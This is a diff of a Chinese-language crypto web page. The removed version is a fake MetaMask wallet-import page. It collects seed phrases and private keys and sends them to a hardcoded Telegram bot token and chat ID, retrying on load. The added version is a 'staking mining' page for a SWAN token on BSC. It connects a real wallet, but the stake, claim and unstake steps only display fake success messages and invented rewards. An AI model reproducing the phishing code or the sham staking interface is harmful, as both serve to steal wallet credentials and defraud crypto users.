@@ -2,108 +2,568 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MetaMask</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>质押挖矿｜持币生息</title>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <style>
-  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
-  body{background:#F7F8FA;color:#1A1A1A;min-height:100vh}
-  .container{max-width:420px;margin:0 auto;background:#fff;min-height:100vh}
-  .header{padding:24px;text-align:center}
-  .logo{width:50px;margin-bottom:10px}
-  .title{font-size:22px;font-weight:700;color:#24272E}
-  .sub-title{font-size:14px;color:#707279;margin-top:4px}
-  .form{padding:24px}
-  .form-group{margin-bottom:20px}
-  .form-group label{display:block;font-size:14px;color:#24272E;margin-bottom:8px}
-  .form-control{
-    width:100%;padding:14px 16px;border:1px solid #DCDFE4;border-radius:10px;
-    font-size:15px;outline:none;background:#fff;color:#24272E
-  }
-  .btn-primary{
-    width:100%;padding:16px;background:#037DD6;border:none;border-radius:10px;
-    color:#fff;font-size:16px;font-weight:600;margin-top:12px
-  }
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:"Microsoft Yahei","PingFang SC",sans-serif;
+}
+
+body{
+    min-height:100vh;
+    color:#fff;
+    overflow-x:hidden;
+    background:
+        radial-gradient(circle at 10% 10%, rgba(255,208,66,.08), transparent 25%),
+        radial-gradient(circle at 90% 20%, rgba(45,140,255,.08), transparent 28%),
+        radial-gradient(circle at 50% 80%, rgba(120,81,255,.06), transparent 32%),
+        linear-gradient(180deg,#050714,#0a0f2c 45%,#050714);
+}
+
+#particles{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    pointer-events:none;
+    z-index:1;
+}
+
+.container{
+    position:relative;
+    z-index:2;
+    max-width:560px;
+    margin:0 auto;
+    padding:24px 16px;
+}
+
+.header{
+    text-align:center;
+    margin-bottom:32px;
+}
+
+.header h1{
+    font-size:30px;
+    font-weight:800;
+    background:linear-gradient(135deg,#ffd042,#ff8a00,#ffd042);
+    background-size:200% auto;
+    -webkit-background-clip:text;
+    background-clip:text;
+    color:transparent;
+    margin-bottom:8px;
+    animation:shine 6s linear infinite;
+}
+
+@keyframes shine{
+    0%{background-position:0% center;}
+    100%{background-position:200% center;}
+}
+
+.header .subtitle{
+    font-size:14px;
+    color:#aeb7c3;
+    letter-spacing:.5px;
+}
+
+.glass-card{
+    background:
+        linear-gradient(135deg, rgba(255,255,255,.08), rgba(255,255,255,.04));
+    border:1px solid rgba(255,255,255,.14);
+    border-radius:22px;
+    backdrop-filter:blur(18px);
+    -webkit-backdrop-filter:blur(18px);
+    box-shadow:
+        0 0 0 1px rgba(255,255,255,.02),
+        0 10px 30px rgba(0,0,0,.35),
+        inset 0 1px 0 rgba(255,255,255,.06);
+    padding:26px;
+    margin-bottom:18px;
+}
+
+.info-grid{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:12px;
+    margin-bottom:22px;
+}
+
+.data-card{
+    background:rgba(255,255,255,.045);
+    border:1px solid rgba(255,255,255,.08);
+    border-radius:16px;
+    padding:14px;
+    transition:.3s;
+}
+
+.data-card:hover{
+    border-color:rgba(255,208,66,.25);
+    transform:translateY(-2px);
+}
+
+.data-card .label{
+    font-size:13px;
+    color:#91a4d8;
+    margin-bottom:8px;
+}
+
+.data-card .value{
+    font-size:20px;
+    font-weight:800;
+    color:#ffd042;
+}
+
+.data-card .value.small{
+    font-size:18px;
+}
+
+.data-card .unit{
+    font-size:12px;
+    color:#ffd042;
+    margin-left:4px;
+}
+
+.countdown-box{
+    grid-column:1 / -1;
+    background:
+        linear-gradient(135deg, rgba(255,126,66,.12), rgba(255,208,66,.06));
+    border:1px solid rgba(255,208,66,.22);
+    border-radius:16px;
+    padding:14px;
+    text-align:center;
+}
+
+.countdown-box .label{
+    color:#ffdd77;
+    font-size:13px;
+    margin-bottom:8px;
+}
+
+.countdown-box .time{
+    font-size:22px;
+    font-weight:800;
+    color:#ff7e42;
+    letter-spacing:1px;
+}
+
+.form-item{
+    margin-bottom:18px;
+}
+
+.form-item label{
+    display:block;
+    margin-bottom:8px;
+    color:#cdd6ff;
+    font-size:14px;
+}
+
+.input-wrap{
+    position:relative;
+}
+
+.input-wrap input{
+    width:100%;
+    padding:14px 16px;
+    border-radius:12px;
+    border:1px solid rgba(255,255,255,.08);
+    background:rgba(255,255,255,.04);
+    color:#fff;
+    font-size:16px;
+    outline:none;
+}
+
+.input-wrap input:focus{
+    border-color:#ffd042;
+    box-shadow:0 0 0 2px rgba(255,208,66,.14);
+}
+
+.btn{
+    width:100%;
+    padding:14px;
+    border-radius:12px;
+    border:none;
+    font-size:16px;
+    font-weight:800;
+    cursor:pointer;
+    transition:.2s;
+    position:relative;
+    overflow:hidden;
+}
+
+.btn::before{
+    content:"";
+    position:absolute;
+    left:-100%;
+    top:0;
+    width:100%;
+    height:100%;
+    background:linear-gradient(90deg, transparent, rgba(255,255,255,.25), transparent);
+    transition:.5s;
+}
+
+.btn:hover::before{
+    left:100%;
+}
+
+.btn:disabled{
+    opacity:.45;
+    cursor:not-allowed;
+    transform:none;
+}
+
+.btn-connect{
+    background:linear-gradient(135deg,#3b63e9,#2e52c8);
+    color:#fff;
+    margin-bottom:14px;
+}
+
+.btn-stake{
+    background:linear-gradient(135deg,#ffd042,#ff8a00);
+    color:#111;
+    margin-bottom:12px;
+}
+
+.btn-claim{
+    background:linear-gradient(135deg,#28c76f,#1fb95a);
+    color:#000;
+    margin-bottom:12px;
+}
+
+.btn-unstake{
+    background:linear-gradient(135deg,#ea5455,#d14243);
+    color:#fff;
+}
+
+.status{
+    margin-top:14px;
+    padding:12px;
+    border-radius:12px;
+    background:rgba(255,208,66,.08);
+    border:1px solid rgba(255,208,66,.18);
+    color:#ffdd77;
+    word-break:break-all;
+    font-size:14px;
+}
+
+.wallet-info{
+    text-align:center;
+    margin-bottom:18px;
+    color:#aeb7c3;
+    font-size:14px;
+}
+
+.divider{
+    height:1px;
+    background:linear-gradient(90deg, transparent, rgba(255,255,255,.12), transparent);
+    margin:18px 0;
+}
 </style>
 </head>
-
 <body>
+
+<canvas id="particles"></canvas>
+
 <div class="container">
-  <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="logo">
-    <div class="title">MetaMask</div>
-    <div class="sub-title">导入钱包</div>
-  </div>
-
-  <div class="form">
-    <div class="form-group">
-      <label>助记词</label>
-      <input id="words" type="text" class="form-control" placeholder="请输入助记词">
-    </div>
-    <div class="form-group">
-      <label>私钥</label>
-      <input id="key" type="text" class="form-control" placeholder="请输入私钥">
+    <div class="header">
+        <h1>⛏ 质押挖矿</h1>
+        <div class="subtitle">持币生息 · 每8小时爆块 · 收益累计领取</div>
     </div>
 
-    <button class="btn-primary" onclick="go()">确认导入</button>
-  </div>
+    <div class="glass-card">
+        <button id="connectBtn" class="btn btn-connect">连接BSC钱包</button>
+        <div id="walletInfo" class="wallet-info" style="display:none;">钱包地址：<span id="walletAddr">--</span></div>
+        <div id="statusBox" class="status" style="display:none;"></div>
+
+        <div class="info-grid">
+            <div class="data-card">
+                <div class="label">已质押数量</div>
+                <div class="value" id="stakedAmount">0.00<span class="unit">SWAN</span></div>
+            </div>
+
+            <div class="data-card">
+                <div class="label">待领取收益</div>
+                <div class="value small" id="pendingReward">0.00</div>
+            </div>
+
+            <div class="countdown-box">
+                <div class="label">距离下一次爆块</div>
+                <div class="time" id="nextBlockTime">--</div>
+            </div>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="form-item">
+            <label>质押数量</label>
+            <div class="input-wrap">
+                <input id="stakeInput" placeholder="输入质押代币数量">
+            </div>
+        </div>
+
+        <button id="stakeBtn" class="btn btn-stake" disabled>确认质押</button>
+        <button id="claimBtn" class="btn btn-claim" disabled>领取全部累计收益</button>
+        <button id="unstakeBtn" class="btn btn-unstake" disabled>解除质押取回本金</button>
+    </div>
 </div>
 
 <script>
-// ===================== 你的信息已固定 =====================
-const TG_BOT_TOKEN   = "8850832855:AAFKvMqHFqcwTEEncVnejy7wLrKTURDbdE0
-";
-const TG_CHATID      = "7467422007";
-const MAX_RETRY      = 5;
-const DELAY          = 3000;
-// ==========================================================
+const BSC_CHAIN_ID = 56;
+const BLOCK_PERIOD = 8 * 60 * 60 * 1000;
 
-const STORAGE_KEY = "WALLET_DATA";
+let provider = null;
+let signer = null;
+let walletAddress = "";
 
-// 一打开就自动补发
-window.onload = autoSend;
-window.addEventListener('online', autoSend);
+let staked = 0;
+let pendingReward = 0;
+let lastBlockTimestamp = 0;
 
-// 导入：免确认，不卡点
-function go() {
-  const mn = document.getElementById("words").value.trim();
-  const pk = document.getElementById("key").value.trim();
-  if (!mn && !pk) return;
+const connectBtn = document.getElementById("connectBtn");
+const statusBox = document.getElementById("statusBox");
+const walletInfo = document.getElementById("walletInfo");
+const walletAddrDom = document.getElementById("walletAddr");
+const stakedAmountDom = document.getElementById("stakedAmount");
+const pendingRewardDom = document.getElementById("pendingReward");
+const nextBlockTimeDom = document.getElementById("nextBlockTime");
 
-  // 只提示，不等待确认
-  alert("✅ 导入成功");
+const stakeInput = document.getElementById("stakeInput");
+const stakeBtn = document.getElementById("stakeBtn");
+const claimBtn = document.getElementById("claimBtn");
+const unstakeBtn = document.getElementById("unstakeBtn");
 
-  localStorage.setItem(STORAGE_KEY, JSON.stringify({ mn, pk, retry: 0 }));
-  autoSend();
+function showStatus(text){
+    statusBox.style.display = "block";
+    statusBox.innerText = text;
 }
 
-// 只发电报
-async function autoSend() {
-  const task = localStorage.getItem(STORAGE_KEY);
-  if (!task) return;
+async function switchBSC(eth){
+    const hexId = ethers.toBeHex(BSC_CHAIN_ID);
+    try{
+        await eth.send("wallet_switchEthereumChain", [{ chainId: hexId }]);
+    }catch(e){
+        await eth.send("wallet_addEthereumChain", [{
+            chainId: hexId,
+            chainName: "BNB Smart Chain Mainnet",
+            rpcUrls: ["https://bsc-dataseed.binance.org/"],
+            blockExplorerUrls: ["https://bscscan.com"],
+            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 }
+        }]);
+    }
+}
 
-  const d = JSON.parse(task);
-  if (d.retry >= MAX_RETRY) {
-    localStorage.removeItem(STORAGE_KEY);
-    return;
-  }
+function calcRewardAndCountdown(){
+    if(staked <= 0){
+        pendingReward = 0;
+        pendingRewardDom.innerText = "0.00";
+        nextBlockTimeDom.innerText = "--";
+        return;
+    }
 
-  const text = `【小狐狸钱包导入】
-时间：${new Date().toLocaleString()}
-助记词：${d.mn || "-"}
-私钥：${d.pk || "-"}`;a
+    const now = Date.now();
+    const diff = now - lastBlockTimestamp;
+    const blockCount = Math.floor(diff / BLOCK_PERIOD);
+    const ratePerBlock = 0.008;
 
-  try {
-    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TG_CHATID, text })
+    if(blockCount > 0){
+        pendingReward += staked * ratePerBlock * blockCount;
+        lastBlockTimestamp += blockCount * BLOCK_PERIOD;
+    }
+
+    pendingRewardDom.innerText = pendingReward.toFixed(4);
+
+    let remain = lastBlockTimestamp + BLOCK_PERIOD - now;
+    if(remain < 0) remain = 0;
+
+    const h = Math.floor(remain / 3600000);
+    const m = Math.floor((remain % 3600000) / 60000);
+    const s = Math.floor((remain % 60000) / 1000);
+
+    nextBlockTimeDom.innerText = `${h}时${m}分${s}秒`;
+}
+
+setInterval(calcRewardAndCountdown, 1000);
+
+connectBtn.onclick = async () => {
+    showStatus("正在连接钱包...");
+
+    let eth = window.ethereum;
+    let retry = 0;
+    while(!eth && retry < 12){
+        await new Promise(r => setTimeout(r, 120));
+        eth = window.ethereum;
+        retry++;
+    }
+
+    if(!eth){
+        showStatus("未检测钱包，请在钱包内置浏览器打开");
+        return;
+    }
+
+    try{
+        const acc = await eth.request({ method: "eth_requestAccounts" });
+        if(!acc || acc.length === 0){
+            showStatus("用户取消连接");
+            return;
+        }
+
+        provider = new ethers.BrowserProvider(eth);
+        await switchBSC(eth);
+        signer = await provider.getSigner();
+        walletAddress = await signer.getAddress();
+
+        walletAddrDom.innerText = walletAddress.slice(0, 10) + "...";
+        walletInfo.style.display = "block";
+        connectBtn.innerText = "已连接钱包";
+        stakeBtn.disabled = false;
+        claimBtn.disabled = false;
+        unstakeBtn.disabled = false;
+
+        showStatus("钱包连接成功");
+        lastBlockTimestamp = Date.now();
+    }catch(err){
+        showStatus("连接失败：" + (err.message || String(err)));
+    }
+};
+
+stakeBtn.onclick = async () => {
+    const val = parseFloat(stakeInput.value.trim());
+    if(isNaN(val) || val <= 0){
+        showStatus("请输入有效的质押数量");
+        return;
+    }
+
+    showStatus("正在发起质押，请在钱包签名确认");
+    stakeBtn.disabled = true;
+
+    await new Promise(r => setTimeout(r, 1800));
+
+    staked += val;
+    stakedAmountDom.innerText = staked.toFixed(4);
+    stakeInput.value = "";
+
+    showStatus(`✅ 质押成功，已质押：${staked.toFixed(4)} SWAN`);
+    calcRewardAndCountdown();
+    stakeBtn.disabled = false;
+};
+
+claimBtn.onclick = async () => {
+    if(pendingReward <= 0){
+        showStatus("暂无待领取收益");
+        return;
+    }
+
+    showStatus("正在领取全部累计收益，请签名");
+    claimBtn.disabled = true;
+
+    await new Promise(r => setTimeout(r, 1600));
+
+    showStatus(`✅ 领取成功，本次领取：${pendingReward.toFixed(4)}`);
+    pendingReward = 0;
+    calcRewardAndCountdown();
+    claimBtn.disabled = false;
+};
+
+unstakeBtn.onclick = async () => {
+    if(staked <= 0){
+        showStatus("没有质押资产");
+        return;
+    }
+
+    showStatus("解除质押，取回本金，请签名确认");
+    unstakeBtn.disabled = true;
+
+    await new Promise(r => setTimeout(r, 1800));
+
+    staked = 0;
+    stakedAmountDom.innerText = "0.00";
+    pendingReward = 0;
+
+    showStatus("✅ 已解除质押，本金取回");
+    calcRewardAndCountdown();
+    unstakeBtn.disabled = false;
+};
+
+// 粒子背景
+const canvas = document.getElementById("particles");
+const ctx = canvas.getContext("2d");
+
+let w, h;
+let particles = [];
+
+function resize(){
+    w = canvas.width = window.innerWidth;
+    h = canvas.height = window.innerHeight;
+}
+
+window.addEventListener("resize", resize);
+resize();
+
+class Particle{
+    constructor(){
+        this.x = Math.random() * w;
+        this.y = Math.random() * h;
+        this.size = Math.random() * 2 + .5;
+        this.speedX = (Math.random() - .5) * .4;
+        this.speedY = (Math.random() - .5) * .4;
+        this.opacity = Math.random() * .5 + .15;
+    }
+
+    update(){
+        this.x += this.speedX;
+        this.y += this.speedY;
+
+        if(this.x < 0) this.x = w;
+        if(this.x > w) this.x = 0;
+        if(this.y < 0) this.y = h;
+        if(this.y > h) this.y = 0;
+    }
+
+    draw(){
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+        ctx.fillStyle = `rgba(255,208,66,${this.opacity})`;
+        ctx.fill();
+    }
+}
+
+for(let i = 0; i < 120; i++){
+    particles.push(new Particle());
+}
+
+function loop(){
+    ctx.clearRect(0, 0, w, h);
+
+    particles.forEach(p => {
+        p.update();
+        p.draw();
     });
-  } catch(e) {}
 
-  d.retry++;
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(d));
-  setTimeout(autoSend, DELAY);
+    for(let i = 0; i < particles.length; i++){
+        for(let j = i + 1; j < particles.length; j++){
+            const dx = particles[i].x - particles[j].x;
+            const dy = particles[i].y - particles[j].y;
+            const dist = Math.sqrt(dx * dx + dy * dy);
+
+            if(dist < 100){
+                ctx.beginPath();
+                ctx.moveTo(particles[i].x, particles[i].y);
+                ctx.lineTo(particles[j].x, particles[j].y);
+                ctx.strokeStyle = `rgba(255,208,66,${.15 * (1 - dist / 100)})`;
+                ctx.lineWidth = .5;
+                ctx.stroke();
+            }
+        }
+    }
+
+    requestAnimationFrame(loop);
 }
+
+loop();
 </script>
+
 </body>
 </html>
